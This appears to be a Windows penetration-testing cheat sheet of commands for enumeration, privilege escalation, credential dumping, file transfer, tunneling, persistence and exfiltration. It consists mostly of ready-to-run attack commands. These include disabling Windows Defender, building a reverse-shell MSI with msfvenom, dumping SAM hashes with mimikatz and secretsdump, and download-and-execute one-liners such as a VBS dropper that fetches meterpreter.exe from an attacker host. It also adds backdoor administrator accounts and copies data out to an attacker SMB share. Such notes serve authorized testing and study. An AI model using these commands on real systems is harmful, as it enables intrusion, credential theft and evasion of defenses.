# Quick Enum    
## Command line
    systeminfo 
    whoami /priv
    ipconfig /all     
    net users   
    qwinsta                          #is anyone else logged in?   
    net localgroup    
    dir /r    
    tree /a /f    
    set                               #enviromental variables
    net use                           #connected drives
    
    netstat /anto    
    netsh firewall show state 
    netsh firewall show config
    
## Powershell
    Get-ExecutionPolicy    
    Set-ExecutionPolicy Unrestricted   
    Set-MpPreference -DisableRealtimeMonitoring $true   
    
## Scripts 
**You might want to check for AV first!**  

[winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)   
[JAWS](https://github.com/411Hall/JAWS) 
[Other scripts here](https://github.com/Scr1ptK1ddie/WindowsBinaries) 

## Checklists    
[HackTricks](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)  
[Fuzzy security](http://www.fuzzysecurity.com/tutorials/16.html) 

____   

# Manual Enum 
https://lolbas-project.github.io/#   
    
## Service Exploits 
    tasklist /svc 
    sc query 
    net start/stop service  
### Insecure Service Properties   
Dangerous perms: SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS
    sc qc [service name]  
### Unquoted Service Paths
    wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" 2>nul |findstr /i /v """   
    sc qc [service name]        #to check what account service runs under 
    powershell "get-acl -Path 'C:\Program Files (x86)\Service Folder' | format-list"     #to check dir perms 

### Weak Registry Permissions
### Insecure Service Executables 
    accesschk.exe -uwcqv "Everyone" *
    accesschk.exe -uwcqv "Authenticated Users" *
    accesschk.exe -uwcqv "Users" *
### Scheduled Tasks
    schtasks /query /fo LIST 2>nul | findstr TaskName  
    dir C:\windows\tasks  
### DLL Search Order Hijacking

## Registry Exploits
### Autoruns
### AlwaysInstallElevated
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=53 -f msi -o reverse.msi /quiet /i reverse.msi
## Passwords
    findstr /si password *.xml *.ini *.txt *.config 2>nul    
    dir /s *pass* == *vnc* == *.config* 2>nul    
    
    dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul    
    
### Saved creds
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
    cmdkey /list   
    dir C:\Users\username\AppData\Local\Microsoft\Credentials\   
    dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\   
    
    runas /savecred /user:[user name] C:\PrivEsc\reverse.exe
### Creds in Registry 
    reg query HKLM /f password /t REG_SZ /s
    reg query HKCU /f password /t REG_SZ /s
### SAM and SYSTEM Files
    %SYSTEMROOT%\repair\SAM
    %SYSTEMROOT%\System32\config\RegBack\SAM
    %SYSTEMROOT%\System32\config\SAM
    %SYSTEMROOT%\repair\system
    %SYSTEMROOT%\System32\config\SYSTEM
    %SYSTEMROOT%\System32\config\RegBack\system 
### Extracting SAM and SYSTEM   

[CVE-2021-36934, the SeriousSAM local privilege escalation](https://github.com/HuskyHacks/ShadowSteal)  

Manually or use [mimikatz](https://github.com/gentilkiwi/mimikatz) 

Manually:

     reg.exe save HKLM\SAM sam.bak 
     reg.exe save HKLM\SYSTEM system.bak 
     *transfer files to attack box then dump* 
     python3 /usr/local/bin/secretsdump.py -sam sam.bak -system system.bak LOCAL 

Mimikatz: 

     privilege::debug 
     token::elevate 
     lsadump::sam  
     
*then crack hashes or use pass the hash to login* [Online hash cracker](https://crackstation.net/) 

## Kernel exploits   
    systeminfo | findstr /B /C:"OS Name" /C:"OS Version"     
    wmic qfe get Caption,Description,HotFixID,InstalledOn     
### Tools
https://github.com/bitsadmin/wesng   
https://github.com/rasta-mouse/Watson   
### Precompiled Kernel Exploits
https://github.com/SecWiki/windows-kernel-exploits   

## Misc  

[SYSTEM Nightmare](https://github.com/GossiTheDog/SystemNightmare) Print nightmare implementation   

____   

# File Transfer     
[Reference - 15 ways to download files](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-download-a-file/)     
[Windows oneliners to download remote payload and execute arbitrary code](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)   
[Windows One liners for file uploading](https://www.asafety.fr/en/vuln-exploit-poc/windows-dos-powershell-upload-de-fichier-en-ligne-de-commande-one-liner/)     

**try certutil first - sometimes Powershell has problems, check size of file to see if transfer was successful** 

    sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
    copy \\10.6.85.85\kali\shell.exe C:\PrivEsc\shell.exe

    certutil.exe -urlcache -split -f "http://$IP/file.bat" file.bat    
    
## Powershell
    powershell -c wget "http://$IP/file.exe" -outfile "file.exe"   
    powershell "(New-Object System.Net.WebClient).DownloadFile('$IP','$PORT')"   
    powershell Invoke-WebRequest -Uri http://$IP:$PORT/PowerUp.ps1 -OutFile C:\Windows\Temp\out  
    
    IEX(New-Object Net.WebClient).downloadString('http://server/script.ps1')

## VBS 
    echo Set o=CreateObject^("MSXML2.XMLHTTP"^):Set a=CreateObject^("ADODB.Stream"^):Set f=Createobject^("Scripting.FileSystemObject"^):o.open "GET", "http://<attacker ip>/meterpreter.exe", 0:o.send^(^):If o.Status=200 Then > "C:\temp\download.vbs" &echo a.Open:a.Type=1:a.Write o.ResponseBody:a.Position=0:If f.Fileexists^("C:\temp\meterpreter.exe"^) Then f.DeleteFile "C:\temp\meterpreter.exe" >> "C:\temp\download.vbs" &echo a.SaveToFile "C:\temp\meterpreter.exe" >>"C:\temp\download.vbs" &echo End if >>"C:\temp\download.vbs" &cscript //B "C:\temp\download.vbs" &del /F /Q "C:\temp\download.vbs"

## XM File Creation (Using copy and paste)
    PS C:\> $console = [XML] @"
    <XML CODE CODE HERE>
    "@
    /# write the xml to file:
    PS C:\> $console.save("C:\users\burmat\documents\console.xml")
 ## Windows 10 - curl
    curl http://server/file -o file
    curl http://server/file.bat | cmd
 ____   
 # Port Forwarding / Tunneling
 Expose internal services, usually hidden due to firewall rules or gain further access into a network. 
 If pivot is a Linux box with python installed you can ssh into: can use [sshuttle](https://github.com/sshuttle/sshuttle) to connect into network. 
 
     netsh firewall show config 
     netsh advfirewall firewall add rule name="NAME" dir=in action=allow protocol=tcp localport=PORT      
## SSH (Window 10 and newer)
     [from target box to expose SMB ]
     ssh -l user -pw password -R 445:127.0.0.1:445 YOURIPADDRESS 
## Plink.exe
     [upload plink.exe](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)  
     plink.exe -l user -pw password -R 445:127.0.0.1:445 YOURIPADDRESS   <-note entering in your password on a victim box is a bad idea
     
     [generate ssh keys on kali, convert to putty keys and then upload with plink.exe to target ] 
     sudo apt install putty-tools 
     puttygen KEYFILE -o OUTPUT_KEY.ppk 
     cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N 
## Chisel 
[Chisel](https://github.com/jpillora/chisel) 
Good for getting through firewalls, need correct copies of binaries on both target / attack box  
Need to change /etc/proxychains4.conf socks4 to socks5 on attack box 
### Chisel socks Reverse Proxy 
    attack    ./chisel server -p LISTEN_PORT --reverse &  
    target    ./chisel client ATTACKING_IP:LISTEN_PORT R:socks & 
### Chisel socks Forward Proxy 
    target    ./chisel server -p LISTEN_PORT --socks5  
    attack    ./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks 
### Chisel Remote Port Forward 
    attack    ./chisel server -p LISTEN_PORT --reverse &  
    target    ./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT & 
### Chisel Local Port Forward 
    target    ./chisel server -p LISTEN_PORT 
    attack    ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT 
 ## Network Scanning / Enum 
 [Static Windows binaries](https://github.com/andrew-d/static-binaries/tree/master/binaries/windows) 
 
    for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up.     
    route print 
    arp -a  
    C:\Windows\System32\drivers\etc\host        Windows DNS entries  
 ____
 # Persistence
     net user USERNAME PASSWORD /add
     net localgroup Administrators USERNAME /add
     net localgroup "Remote Management Users" USERNAME /add    
 ## Access  
     pass the hash: evil-winrm -u Administrator -H ADMIN_HASH -i IP  
     xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share   
     \\tsclient\share\mimikatz\x64\mimikatz.exe   
     psexec 
 ____ 
 # Post Exploitation / Exfiltration 
 [Data Exfiltration Techniques](https://www.pentestpartners.com/security-blog/data-exfiltration-techniques/)    
 
     python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -username USER -password PASS 
     net use \\IP\share /USER:USER PASS  
     copy FILE \\IP\share\FILE  

 ## AV Evasion  
 ### Check for AV  
     sc query windefend
     "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All               #Delete all rules of Defender (useful for machines without internet access)   
 ### Obfuscate Payloads
Use wrapper files to call static executables (such as nc) 

     
 ____
 
# Resources
## Cheat Sheets and Guides 
https://burmat.gitbook.io/security/hacking/one-liners-and-dirty-scripts  
https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/   
https://securism.wordpress.com/oscp-notes-privilege-escalation-windows/ 

## Learn More
https://www.roguesecurity.in/2018/12/02/a-guide-for-windows-penetration-testing/      
https://github.com/frizb/Windows-Privilege-Escalation    
https://toshellandback.com/2015/11/24/ms-priv-esc/

  
